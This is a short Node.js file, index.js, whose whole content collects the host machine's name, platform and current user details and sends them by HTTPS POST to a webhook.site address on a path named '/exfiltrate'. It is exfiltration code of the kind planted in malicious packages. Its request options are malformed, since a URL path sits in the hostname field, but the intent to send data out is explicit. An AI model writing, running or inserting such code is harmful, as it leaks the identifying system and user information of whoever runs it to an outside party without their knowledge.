// index.js
const https = require('https');
const os = require('os');
const data = JSON.stringify({
  hostname: os.hostname(),
  platform: os.platform(),
  userInfo: os.userInfo(),
});

const options = {
  hostname: 'webhook.site/297a3bbd-e627-4ee3-8939-4719355fa74c',
  port: 443,
  path: '/exfiltrate',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

const req = https.request(options, (res) => {
  res.on('data', (d) => {
    process.stdout.write(d);
  });
});

req.on('error', (e) => {
  console.error(e);
});

req.write(data);
req.end();
